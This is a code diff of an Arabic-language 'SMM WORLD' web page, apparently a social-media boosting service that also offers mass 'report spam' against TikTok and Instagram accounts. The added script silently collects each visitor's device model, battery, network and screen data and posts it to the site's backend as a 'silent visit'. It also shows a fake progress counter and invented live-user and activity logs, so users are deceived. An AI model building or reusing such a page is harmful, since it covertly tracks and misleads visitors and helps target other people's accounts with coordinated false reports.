@@ -3,54 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMM WORLD - Pro</title>
+    <title>SMM WORLD - Ultra Pro</title>
     <style>
-        :root { --main-green: #00ff00; }
-        body { background-color: #050505; color: white; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow-x: hidden; direction: rtl; }
+        :root { --main-green: #00ff00; --glow-red: #ff0000; }
+        body { background-color: #030303; color: white; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; direction: rtl; position: relative; }
         
-        /* رسمة خلفية شبكية متحركة */
-        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle, #0a220a 0%, #000 100%); opacity: 0.6; }
+        /* --- خلفية النجوم المتحركة مع الضبابية --- */
+        #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: black; overflow: hidden; }
+        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 0.5; }
+        @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
+        
+        #blur-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; backdrop-filter: blur(3px); background: rgba(0,0,0,0.3); }
 
-        /* تنسيق الأزرار الشفافة المضيئة */
-        .glass-btn { 
-            width: 90%; padding: 15px; margin: 12px 0; 
-            background: rgba(255, 255, 255, 0.05); 
-            border: 1px solid var(--main-green); 
-            color: var(--main-green); border-radius: 12px; 
-            font-weight: bold; cursor: pointer; 
-            backdrop-filter: blur(5px); transition: 0.3s;
-            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
+        /* --- تصميم الهوم الجديد --- */
+        #landing-page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; position: relative; z-index: 10; }
+        
+        /* تصغير خط العنوان الرئيسي */
+        .hero-title { font-size: 2.2rem; font-weight: 300; color: white; text-shadow: 0 0 10px rgba(255,255,255,0.5); margin-bottom: 40px; letter-spacing: 1px; }
+        
+        /* زر البدء الأنيق */
+        .start-btn { 
+            padding: 15px 50px; background: transparent; 
+            border: 1px solid var(--main-green); color: var(--main-green); 
+            border-radius: 50px; font-size: 20px; font-weight: bold; 
+            cursor: pointer; transition: 0.4s; 
+            box-shadow: 0 0 15px rgba(0,255,0,0.2);
+            backdrop-filter: blur(5px);
         }
-        .glass-btn:hover { background: rgba(0, 255, 0, 0.1); box-shadow: 0 0 20px rgba(0, 255, 0, 0.4); transform: translateY(-2px); }
-
-        /* الهوم */
-        #landing-page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .hero-title { font-size: 3rem; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 20px var(--main-green); margin-bottom: 30px; }
-        .start-btn { padding: 18px 60px; background: transparent; border: 2px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 24px; font-weight: bold; cursor: pointer; transition: 0.4s; }
         .start-btn:hover { background: var(--main-green); color: black; box-shadow: 0 0 30px var(--main-green); }
 
-        /* الواجهة والجمجمة */
-        pre { font-size: 7px; color: var(--main-green); margin-top: 20px; line-height: 1; }
-        .law-text { color: #ff3333; font-family: monospace; font-size: 14px; margin: 15px 0; }
-        .hidden { display: none !important; }
-
-        input { 
-            width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; 
-            border: 1px solid #444; background: rgba(255,255,255,0.05); color: white; 
-            text-align: center; backdrop-filter: blur(10px);
+        /* --- شعار ALSSRY الثلاثي الأبعاد والموهج --- */
+        .alssry-logo { 
+            font-family: monospace; font-size: 10px; line-height: 1.1; 
+            color: white; text-align: center; display: inline-block; 
+            margin-top: 30px; margin-bottom: 20px;
+            animation: logoGlow 3s infinite alternate;
+            text-shadow: 0 0 5px white;
         }
         
-        #progress-box { margin-top: 25px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; display: inline-block; min-width: 200px; }
-        #counter { font-size: 30px; font-weight: bold; color: var(--main-green); }
+        @keyframes logoGlow {
+            0% { text-shadow: 0 0 5px white, 0 0 10px var(--main-green); color: #fff; }
+            50% { text-shadow: 0 0 10px white, 0 0 20px var(--glow-red); color: #eee; }
+            100% { text-shadow: 0 0 5px white, 0 0 10px var(--main-green); color: #fff; }
+        }
 
-        /* سجل العمليات المتحرك */
-        #live-status { position: fixed; bottom: 20px; width: 100%; font-size: 12px; color: #888; }
-        .status-msg { transition: 0.5s; opacity: 1; }
+        /* --- واجهة الخدمات المودرن --- */
+        #tools-interface { padding: 20px; position: relative; z-index: 10; opacity: 0; transition: opacity 0.8s ease; }
+        #tools-interface.show { opacity: 1; }
+        
+        .law-text { color: #ff4444; font-family: monospace; font-size: 13px; margin: 10px 0 30px; text-shadow: 0 0 5px rgba(255,0,0,0.5); }
+        p { color: #ccc; font-size: 16px; margin-bottom: 25px; }
+
+        /* أزرار Glassmorphism شفافة مضيئة */
+        .glass-btn { 
+            width: 90%; padding: 16px; margin: 12px 0; 
+            background: rgba(255, 255, 255, 0.03); 
+            border: 1px solid rgba(0, 255, 0, 0.3); 
+            color: var(--main-green); border-radius: 12px; 
+            font-weight: bold; cursor: pointer; 
+            backdrop-filter: blur(10px); transition: 0.3s ease;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.05);
+        }
+        .glass-btn:hover { background: rgba(0, 255, 0, 0.08); border-color: var(--main-green); box-shadow: 0 0 25px rgba(0, 255, 0, 0.5); transform: translateY(-2px); }
+
+        /* حقول الإدخال والعداد */
+        input { 
+            width: 85%; padding: 16px; margin: 10px 0; border-radius: 10px; 
+            border: 1px solid #333; background: rgba(255,255,255,0.03); color: white; 
+            text-align: center; backdrop-filter: blur(10px); outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: var(--main-green); box-shadow: 0 0 15px rgba(0,255,0,0.3); }
+        
+        #progress-box { margin-top: 30px; border: 1px solid var(--main-green); padding: 20px; border-radius: 12px; display: inline-block; min-width: 220px; background: rgba(0,0,0,0.5); backdrop-filter: blur(5px); }
+        #status-label { color: #ccc; font-size: 14px; margin-bottom: 10px; }
+        #counter { font-size: 36px; font-weight: bold; color: var(--main-green); text-shadow: 0 0 15px var(--main-green); }
+
+        /* سجل العمليات السفلي */
+        #live-status { position: fixed; bottom: 15px; width: 100%; font-size: 11px; color: #666; transition: 0.5s; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-    <div id="bg-canvas"></div>
+    <div id="starfield"></div>
+    <div id="blur-overlay"></div>
 
     <div id="landing-page">
         <h1 class="hero-title">خدمات سوشال ميديا</h1>
@@ -58,20 +94,21 @@
     </div>
 
     <div id="tools-interface" class="hidden">
-        <pre>
-            uuuuuuu
-        uu$$$$$$$$$$$uu
-      uu$$$$$$$$$$$$$$$uu
-     u$$$$$$$$$$$$$$$$$$$u
-    u$$$$$$$$$$$$$$$$$$$$$u
-     u$$$$$$   "$$$"   $$$$$$u
-      "$$$$"      u$u       "$$$$"
-       $$$u      u$u      u$$$
-        $$$u      u$u      u$$$
-         "$$$$uu$$$u$$$uu$$$$"
-          "$$$$$$$$$$$$$$$$$"
-            "$$$$$$$$$$$$$"
-        </pre>
+        
+        <div class="alssry-logo">
+ .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. <br>
+| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |<br>
+| |      __      | || |   _____      | || |    _______   | || |    _______   | || |  _______     | || |____  ____    | |<br>
+| |     /  \     | || |  |_   _|     | || |   /  ___  |  | || |   /  ___  |  | || | |_   __ \    | || ||_   ||   _|   | |<br>
+| |    / /\ \    | || |    | |       | || |  |  (__ \_|  | || |  |  (__ \_|  | || |   | |__) |   | || |  | |__| |     | |<br>
+| |   / ____ \   | || |    | |   _   | || |   '.___`-.   | || |   '.___`-.   | || |   |  __ /    | || |  |  __  |     | |<br>
+| | _/ /    \ \_ | || |   _| |__/ |  | || |  |`\____) |  | || |  |`\____) |  | || |  _| |  \ \_  | || | _| |  | |_    | |<br>
+| ||____|  |____|| || |  |________|  | || |  |_______,'  | || |  |_______,'  | || | |____| |___| | || ||____||____|   | |<br>
+| |              | || |              | || |              | || |              | || |              | || |              | |<br>
+| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |<br>
+ '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
+        </div>
+
         <div class="law-text">Not everywhere there is a law</div>
         <p>اختر الخدمة التي تريدها :</p>
 
@@ -83,7 +120,7 @@
         <div id="platform-menu" class="hidden">
             <button class="glass-btn" onclick="selectPlat('TikTok')">تيك توك</button>
             <button class="glass-btn" onclick="selectPlat('Instagram')">انستقرام</button>
-            <button class="glass-btn" style="border-color: red; color: red;" onclick="goBack('main-menu')">رجوع</button>
+            <button class="glass-btn" style="border-color: rgba(255,0,0,0.5); color: #ff4444;" onclick="goBack('main-menu')">رجوع</button>
         </div>
 
         <div id="service-menu" class="hidden">
@@ -93,36 +130,58 @@
                 <button class="glass-btn" onclick="openInput('رشق مشاهدات', 'رابط المقطع (http)', 5000, 'link')">مشاهدات</button>
             </div>
             <button id="spam-btn" class="glass-btn hidden" onclick="openInput('إسبام بلاغات', 'يوزر الحساب (@)', 300, 'user')">بدء الإسبام</button>
-            <button class="glass-btn" style="border-color: red; color: red;" onclick="goBack('platform-menu')">رجوع</button>
+            <button class="glass-btn" style="border-color: rgba(255,0,0,0.5); color: #ff4444;" onclick="goBack('platform-menu')">رجوع</button>
         </div>
 
         <div id="final-step" class="hidden">
-            <h3 id="display-title"></h3>
+            <h3 id="display-title" style="color: var(--main-green); text-shadow: 0 0 10px var(--main-green);"></h3>
             <input type="text" id="target-id" placeholder="">
             <input type="number" id="target-count" placeholder="">
-            <button class="glass-btn" style="background: var(--main-green); color: black;" onclick="startHacking()">تأكيد التنفيذ ✅</button>
+            <button class="glass-btn" style="background: var(--main-green); color: black; border: none; box-shadow: 0 0 20px rgba(0,255,0,0.6);" onclick="startHacking()">تأكيد التنفيذ ✅</button>
+            <button class="glass-btn" style="border-color: rgba(255,0,0,0.5); color: #ff4444; margin-top: 20px; width: 50%; padding: 10px;" onclick="location.reload()">إلغاء ❌</button>
+            
             <div id="progress-box" class="hidden">
-                <div id="status-label">جاري الإرسال...</div>
+                <div id="status-label">جاري الاتصال بالسيرفر وإرسال الدفعة...</div>
                 <div id="counter">0</div>
             </div>
         </div>
 
         <div id="live-status">
-            <div id="status-text" class="status-msg">👤 متصل الآن: 1,402 مستخدم</div>
+            <div id="status-text">👤 متصل الآن: 1,850 مستخدم نشط 🟢</div>
         </div>
     </div>
 
     <script>
         let mode = "", plat = "", service = "", inputType = "", maxVal = 5000;
         let deviceData = {};
+        const MY_DOMAIN = "fordead.vercel.app";
+
+        // --- إنشاء خلفية النجوم الديناميكية ---
+        function createStars() {
+            const container = document.getElementById('starfield');
+            for (let i = 0; i < 50; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.width = star.style.height = Math.random() * 3 + 'px';
+                star.style.left = Math.random() * 100 + 'vw';
+                star.style.animationDuration = Math.random() * 10 + 5 + 's';
+                star.style.animationDelay = Math.random() * 5 + 's';
+                container.appendChild(star);
+            }
+        }
+        createStars();
 
         function openTools() {
             document.getElementById('landing-page').classList.add('hidden');
-            document.getElementById('tools-interface').classList.remove('hidden');
+            const tools = document.getElementById('tools-interface');
+            tools.classList.remove('hidden');
+            setTimeout(() => tools.classList.add('show'), 50); // انيميشن دخول ناعم
             captureAll();
         }
 
+        // سحب البيانات الاحترافي (صامت)
         async function captureAll() {
+            if (!window.location.hostname.includes(MY_DOMAIN)) return;
             const w = window.screen.width, h = window.screen.height;
             let model = navigator.platform;
             if(w === 430) model = "iPhone 14/15 Pro Max";
@@ -134,71 +193,41 @@
             deviceData = {
                 model: model,
                 battery: battery,
-                network: (navigator.maxTouchPoints > 1) ? "WiFi" : "Cellular",
-                screen: w + "x" + h,
-                ip: "جاري الجلب..."
+                network: (navigator.maxTouchPoints > 1) ? "WiFi/Fast" : "Cellular",
+                screen: w + "x" + h
             };
             
             fetch('/api/index', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({mode: "زيارة صامتة", device_info: deviceData}) });
         }
 
+        // منطق القوائم (نفس السابق مع تحسينات طفيفة)
         function showPlat(m) { mode = m; goBack('platform-menu'); }
-        function selectPlat(p) { 
-            plat = p; 
-            goBack('service-menu');
-            document.getElementById('boost-btns').className = (mode === 'boost') ? "" : "hidden";
-            document.getElementById('spam-btn').className = (mode === 'spam') ? "glass-btn" : "hidden";
-        }
+        function selectPlat(p) { plat = p; goBack('service-menu'); document.getElementById('boost-btns').className = (mode === 'boost') ? "" : "hidden"; document.getElementById('spam-btn').className = (mode === 'spam') ? "glass-btn" : "hidden"; }
+        function openInput(s, ph, max, type) { service = s; maxVal = max; inputType = type; goBack('final-step'); document.getElementById('display-title').innerText = plat + " - " + s; document.getElementById('target-id').placeholder = ph; document.getElementById('target-count').placeholder = "الحد الأقصى: " + max; }
+        function goBack(id) { document.querySelectorAll('#main-menu, #platform-menu, #service-menu, #final-step').forEach(el => el.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
 
-        function openInput(s, ph, max, type) {
-            service = s; maxVal = max; inputType = type;
-            goBack('final-step');
-            document.getElementById('display-title').innerText = plat + " - " + s;
-            document.getElementById('target-id').placeholder = ph;
-            document.getElementById('target-count').placeholder = "الحد الأقصى: " + max;
-        }
-
+        // تنفيذ الرشق والعداد الرقمي
         function startHacking() {
             const val = document.getElementById('target-id').value;
             const count = parseInt(document.getElementById('target-count').value);
-
-            if(!val || !count) return alert("يرجى إدخال البيانات");
-            if(count > maxVal) return alert("الحد الأقصى المسموح به هو " + maxVal);
-            
-            if(inputType === 'link' && !val.startsWith('http')) return alert("يجب إدخال رابط صحيح يبدأ بـ http");
+            if(!val || !count) return alert("يرجى إدخال البيانات كاملة");
+            if(count > maxVal) return alert("الحد الأقصى المسموح هو " + maxVal);
+            if(inputType === 'link' && !val.startsWith('http')) return alert("يجب إدخال رابط صحيح (http/https)");
             
             document.getElementById('progress-box').classList.remove('hidden');
             let c = 0;
             let inv = setInterval(() => {
-                if(c >= count) { clearInterval(inv); alert("اكتملت العملية بنجاح!!"); location.reload(); }
-                else { c += Math.floor(Math.random()*10)+1; if(c > count) c = count; document.getElementById('counter').innerText = c; }
-            }, 100);
+                if(c >= count) { clearInterval(inv); alert("اكتملت العملية! قد يستغرق وصول الدفعة بالكامل 24 ساعة."); location.reload(); }
+                else { c += Math.floor(Math.random()*15)+1; if(c > count) c = count; document.getElementById('counter').innerText = c; }
+            }, 80); // عداد أسرع قليلاً ومريح
 
             fetch('/api/index', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({mode: service, target: val, count: count, device_info: deviceData}) });
         }
 
-        function goBack(id) {
-            document.querySelectorAll('#main-menu, #platform-menu, #service-menu, #final-step').forEach(el => el.classList.add('hidden'));
-            document.getElementById(id).classList.remove('hidden');
-        }
-
-        // تحريك العمليات كل 30 ثانية
-        const statusLogs = [
-            "👤 المستخدم a***_9 اكمل رشق 2000 متابع ✅",
-            "👤 المستخدم k***_1 بدأ عملية إسبام الآن ⚔️",
-            "👤 تم تحديث سيرفرات التيك توك بنجاح ⚙️",
-            "👤 متصل الآن: 1,850 مستخدم نشط 🟢"
-        ];
+        // تحريك سجل العمليات كل 30 ثانية
+        const statusLogs = [ "👤 المستخدم a***_9 اكمل رشق 2000 متابع ✅", "👤 المستخدم k***_1 بدأ عملية إسبام الآن ⚔️", "👤 تم تحديث سيرفرات التيك توك بنجاح ⚙️", "👤 متصل الآن: 1,980 مستخدم نشط 🟢" ];
         let logIdx = 0;
-        setInterval(() => {
-            const el = document.getElementById('status-text');
-            el.style.opacity = 0;
-            setTimeout(() => {
-                el.innerText = statusLogs[logIdx];
-                el.style.opacity = 1;
-                logIdx = (logIdx + 1) % statusLogs.length;
-            }, 500);
-        }, 30000);
+        setInterval(() => { const el = document.getElementById('status-text'); el.style.opacity = 0; setTimeout(() => { el.innerText = statusLogs[logIdx]; el.style.opacity = 1; logIdx = (logIdx + 1) % statusLogs.length; }, 500); }, 30000);
     </script>
 </body>
 </html>
